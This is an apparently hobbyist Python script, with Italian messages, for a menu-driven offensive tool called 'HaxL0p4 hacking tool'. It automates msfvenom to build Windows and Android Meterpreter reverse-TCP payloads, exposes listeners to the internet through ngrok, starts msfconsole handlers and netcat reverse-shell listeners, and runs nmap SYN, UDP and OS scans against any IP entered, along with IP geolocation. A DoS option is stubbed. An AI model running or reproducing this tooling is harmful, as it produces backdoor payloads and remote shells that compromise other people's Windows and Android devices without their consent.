#!/usr/bin/env python3

import os
import nmap
#from scapy.all import * 
import requests
import json
from colorama import Fore, Style
#from pymetasploit3.msfrpc import MsfRpcClient
#from scapy.all import RandMAC, Dot11, Dot11Beacon, Dot11Elt, RadioTap
import argparse
from tkinter import *
from tkinter import ttk
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random
import subprocess
import time



opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida... {Style.RESET_ALL}\n"

Remote_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
"""
Network_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Network arp-scan             ║
 ║ [2] Ip & Website Scanner         ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝
"""

moduli = {

    "windows": "windows/meterpreter/reverse_tcp",
    "android": "android/meterpreter_reverse_tcp",
    "custom": "custom",
    "exit" : "Back",

}

Moduli_Payload = f"""
 ╔═════════════════════════════════════╗
 ║ [1] {Fore.CYAN}{moduli['windows']}{Style.RESET_ALL} ║ 
 ║ [2] {Fore.CYAN}{moduli['android']}{Style.RESET_ALL} ║
 ║ [3] {Fore.CYAN}{moduli['custom']}{Style.RESET_ALL}                          ║
 ╚═════════════════════════════════════╝
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}99{Style.RESET_ALL}]: {moduli['exit']}                          ║
 ╚═════════════════════════════════════╝
"""

opzioni_menu = f"""
 ╔══════════════════════════════════╗
 ║ [1] Remote Access                ║ 
 ║ [2] Network                      ║
 ║ [3] Track Location               ║
 ║ [4] Dos Attack                   ║
 ║ [5] IP Geolocation               ║
 ║                                  ║
 ║ [{Fore.CYAN}6{Style.RESET_ALL}] Update                       ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Exit                         ║
 ╚══════════════════════════════════╝
"""

# ================================ GUI =============================== #

def haxlopa_gui():
    gui = Tk()
    gui.geometry("1000x700")
    gui.config(bg="#1b1b1b")
    gui.resizable(False, False)

    titolo = ttk.Label(text="HaxL0p4 GUI", font=("Arial", 30, "bold"), foreground="#fff", background="#1b1b1b")
    titolo.pack(padx=10, pady=5)

    gui.mainloop()

# ================================================================== #



def animazione_lettere(testo, ms):
    for lettera in testo:
        print(lettera, end='', flush=True)
        time.sleep(ms)


# ========================== #

def ddos():
    os.system("clear && figlet L0p4 DDos")
    print(f"{Fore.RED}\nProssimamente{Style.RESET_ALL}")
    while True:
        back = input("\nBack? Y/N: ")

        if back.lower() == "y":
            return
        else:
            break

# ========================== #

parser = argparse.ArgumentParser(description="HaxL0p4 hacking tool")
parser.add_argument('--gui', action="store_true", help="Start HaxL0p4 GUI")
args = parser.parse_args()

if args.gui:
    haxlopa_gui()
else:
    pass



def startNgrokServer():
    ngrokPORT = input("\n LOCAL PORT > ") 

    command = f"gnome-terminal --geometry=80x24+1000+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
    subprocess.run(command, shell=True)

def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
    if modulo == 1:
        print("\n")
        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    elif modulo == 2:
        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    elif modulo == 3:
        pass # da fare dopo !

def custom_module(LHOST, LPORT, FORMAT, NAME):
    os.system("clear && figlet Custom Module")
    modulo = input(f"{Fore.LIGHTBLUE_EX}MODULO{Style.RESET_ALL} > ")
    if len(modulo) != 0:
        createPayload(modulo=modulo, LHOST=LHOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)

def setPayload():
    os.system("clear && figlet HaxL0p4")

    print(Moduli_Payload)
    
    while True:
        choice = input(f"\n{Fore.GREEN} HaxL0p4/CreatePayload {Style.RESET_ALL}{Fore.CYAN}> {Style.RESET_ALL}")

        if choice not in ["1", "2", "3", "99"]:
            os.system("clear && figlet HaxL0p4")
            print(Moduli_Payload)
            opzione_non_valida = f" {Fore.RED}[💀] Opzione non valida. Si prega di inserire 'Y' o 'N'.{Style.RESET_ALL}\n"
            animazione_lettere(opzione_non_valida, 0.03)
            continue

        if choice == "99":
            os.system("clear && figlet Hax-Remote")
            print(f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
    """)
            return
        
        lanORwan = input("\n Start WAN server? Y/N: ")

        if lanORwan.lower() == "y":
            startNgrokServer()
        elif lanORwan.lower() == "n":
            pass
        else:
            animazione_lettere(opzione_non_valida, 0.03)

        HOST = input(f"\n LHOST {Fore.CYAN}>{Style.RESET_ALL} ")

        while True:
            try:
                LPORT = int(input(f" LPORT {Fore.CYAN}>{Style.RESET_ALL} "))
                break
            except ValueError:
                print(f"\n {Fore.RED} [!]Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")

        FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
        NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")

        if choice == "1":
            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "2":
            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "3":
            custom_module(LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "99":
            break
        else:
            print("Opzione non valida. Riprova.")


        os.system("clear && figlet HaxL0p4")
        
        msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
        if msf.lower() == "y":
            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
            subprocess.run(command, shell=True)
            return menu()
        elif msf.lower() == "n":
            os.system('exit')



# Ascoltatore netcat reverse shell

def netcatListener():
    try:
        os.system("clear && figlet HaxL0p4-NC")

        while True:
            try:
                port = int(input("\n PORT: "))
                break
            except ValueError:
                porta_non_valida = f"{Fore.RED}\n [💀] Porta non valida...{Style.RESET_ALL}"
                animazione_lettere(porta_non_valida, 0.03)
                return netcatListener()

        proxychains = input(" Use proxychains? Y/N: ")

        if proxychains.lower() in ["y", "n"]:
            if proxychains.lower() == "y":
                os.system(f"sudo proxychains nc -lvp {port}")
            elif proxychains.lower() == "n":
                command = f"sudo nc -lvp {port}"
                os.system(command)
                while True:
                    exit = input(f'\n{Fore.BLUE}Close the revese shell?{Style.RESET_ALL} Y/N: ')
                    if exit.lower() == "y":
                        os.system("clear && figlet Hax-Remote")
                        print(Remote_options)
                        break
                    elif exit.lower() == "n":
                        return
        else:
            opzione_non_valida = f"\n{Fore.RED} [💀] Opzione non valida... Inserire Y o N. {Style.RESET_ALL}"
            animazione_lettere(opzione_non_valida, 0.03)
            return netcatListener()
        
    except KeyboardInterrupt:
        os.system("clear && figlet Hax-Remote")
        print(Remote_options)


def arp_scan():
    os.system("clear && figlet Hax-Scan")
    os.system("\n\narp-scan -l")

    back = input(f"{Fore.RED}\n\nBACK? Y/N: {Style.RESET_ALL}")
    if back.lower() == "y":
        network()
    else:
        pass


def website_scanner():
    os.system("clear && figlet HaxL0p4")

    pass
        

def ip_scanner():
    os.system("clear && figlet HaxL0p4")

    scanner = nmap.PortScanner()

    print("\n HaxL0p4 automation hacking tool")
    print(" <-------------------------------------------------------------->")

    ip_addr = input(' Ip address do you want to scan: ')
    print(f" The ip you entered is: {Fore.RED}{ip_addr}{Style.RESET_ALL}")

    resp = input(f"""\n Please enter the type os scan do you want to run
 ╔══════════════════════════════════╗
 ║ [1] SYN ACK Scan                 ║ 
 ║ [2] UDP Scan                     ║
 ║ [3] Complete Scan                ║
 ╚══════════════════════════════════╝               
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
 ╚═════════════════════════════════════╝
                 
 {Fore.CYAN}HaxL0p4/Network/Scanner/IpScanner/options{Style.RESET_ALL} > """)

    if resp == "1":
        try:
            print(" \nNmap Version: ", scanner.nmap_version())
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
            print(scanner[ip_addr].all_protocols())
            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f"An error occurred: {e}")
    elif resp == "2":
        try:
            print(" \nNmap Version: ", scanner.nmap_version())
            scanner.scan(ip_addr, '1-1024', arguments="-v -sU")
            print(f"udp: services: 1-1024\n Ip Status: up")
            print(scanner[ip_addr].all_protocols())
            open_ports = scanner[ip_addr]['udp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f"An error occurred: {e}")
    elif resp == "3":
        try:
            print(" \nNmap Version: ", scanner.nmap_version())
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS -sC -A -O")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
            print(scanner[ip_addr].all_protocols())
            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f"An error occurred: {e}")
    elif resp == "0":
        return ip_scanner()
    elif resp == "99":
        return menu()
    elif resp >= '4':
        animazione_lettere(opzione_non_valida, 0.03)

    loop = input("\n\nRepeat Scan? Y/N: ")
    while True:
        if loop.lower() == "y":
            return ip_scanner()
        elif loop.lower() == "n":
            return menu()
        else:
            animazione_lettere(opzione_non_valida, 0.03)

        

def scanner():
    os.system("clear && figlet HaxL0p4")
    
    netScan_options = f"""
 ╔═════════════════════════════════════╗
 ║ [1] IP Scanner                      ║ 
 ║ [2] Website Scanner                 ║
 ║ [3] prossimamente                   ║
 ╚═════════════════════════════════════╝

 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
 ╚═════════════════════════════════════╝
"""
    print(netScan_options)
    s = input(f"{Fore.CYAN} HaxL0p4/network/IpScanner{Style.RESET_ALL} > ")

    while True:
        if s == "1":
            ip_scanner()
        elif s == "2":
            #website_scanner()
            animazione_lettere("\n"+opzione_non_valida, 0.03)
            scanner()
        elif s == "3":
            animazione_lettere("\n"+opzione_non_valida, 0.03)
            scanner()
        elif s == "0":
            return network()
        elif s == "99":
            return menu()
        else: 
            animazione_lettere("\n"+opzione_non_valida, 0.03)
            return scanner()


def network():
    os.system("clear && figlet Hax-Net")
    print(Network_options)
    choice = input(f"\n{Fore.CYAN} HaxL0p4/network{Style.RESET_ALL} > ")


    while True:
        if choice == "1":
            arp_scan()
        elif choice == "2":
            scanner()
        elif choice == "0":
            return
        else:
            os.system("clear && figlet Hax-Net")
            print(Network_options)
            opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida...{Style.RESET_ALL}"
            animazione_lettere(opzione_non_valida, 0.03)
            return network()


def track_location(): ...


def get_public_ip():
    response = requests.get("https://api.ipify.org")
    return response.text

def ipGeolocation():
    while True:
        os.system("clear && figlet HaxL0p4")

        public_ip = get_public_ip()
        print(f"\nYour ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
        print(f'\nType "{Fore.RED}0{Style.RESET_ALL}" for return back')

        ip_address = input("\nip: ")

        if ip_address == "0":
            return

        request_url = 'https://geolocation-db.com/jsonp/' + ip_address
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result = json.loads(result)

        print("\nGeolocation Information:")
        print(f"Country Code: {result['country_code']}")
        print(f"Country Name: {result['country_name']}")
        print(f"City: {result['city']}")
        print(f"Postal Code: {result['postal']}")
        print(f"Latitude: {result['latitude']}")
        print(f"Longitude: {result['longitude']}")
        print(f"IPv4 Address: {result['IPv4']}")
        print(f"State: {result['state']}")

        back = input("\nBack Y/N: ")

        if back.lower() == "y":
            return
        elif back.lower() == "n":
            pass
        else:
            print("Opzione non valida...")

def RemoteAccess() :
    try:
        os.system("clear && figlet Hax-Remote ")
        print(Remote_options)

        while True:   
            choice = input(f"\n{Fore.GREEN} HaxL0p4/RemoteAccess{Style.RESET_ALL}{Fore.CYAN} > {Style.RESET_ALL} ")    
            if choice == "1" :
                setPayload()
            elif choice == "2" :
                netcatListener()
            elif choice == "0":
                return
            elif choice == "back":
                return
            else: 
                os.system("clear && figlet Hax-Remote")
                print(Remote_options)
                animazione_lettere(opzione_non_valida, 0.03)
    except KeyboardInterrupt:

        while True:
            exit = input(f"\n{Fore.RED} \n [{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX} Chiudere il programma? Y/N: {Style.RESET_ALL}")
            if exit.lower() == "y":
                chiusura = f"{Fore.GREEN}\n [🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
                animazione_lettere(chiusura, 0.03)
                break
            elif exit.lower() == "n":
                return RemoteAccess()
            else:
                animazione_lettere(opzione_non_valida, 0.03)

def menu():
    try:
        while True:
            os.system("clear && figlet HaxL0p4")
            prossimamente = f" \n{Fore.RED} Ancora non disponibile...{Style.RESET_ALL}"

            print(opzioni_menu)

            s = input(f"{Fore.CYAN} \n HaxL0p4{Style.RESET_ALL} > ")

            if s == "1":
                RemoteAccess()
            elif s == "2":
                network()
            elif s == "3":
                animazione_lettere(prossimamente, 0.03)
                return menu()
                #track_location()
            elif s == "4":
                while True:
                    animazione_lettere(prossimamente, 0.03)
                    return menu()
                    #ddos()
            elif s == "5":
                ipGeolocation()
            elif s == "6":
                os.system("git stash && git pull")
                return menu()
            elif s == "0":
                break
            else: 
                animazione_lettere("\n"+opzione_non_valida, 0.03)
                return menu()
    except KeyboardInterrupt:
        while True:
            exit = input(f"\n{Fore.RED} \n [{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX}Chiudere il programma? Y/N: {Style.RESET_ALL}")
            if exit.lower() == "y":
                chiusura = f"{Fore.GREEN}\n [🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
                animazione_lettere(chiusura, 0.03)
                break
            elif exit.lower() == "n":
                return menu()
            else:
                animazione_lettere(opzione_non_valida, 0.03)

menu()
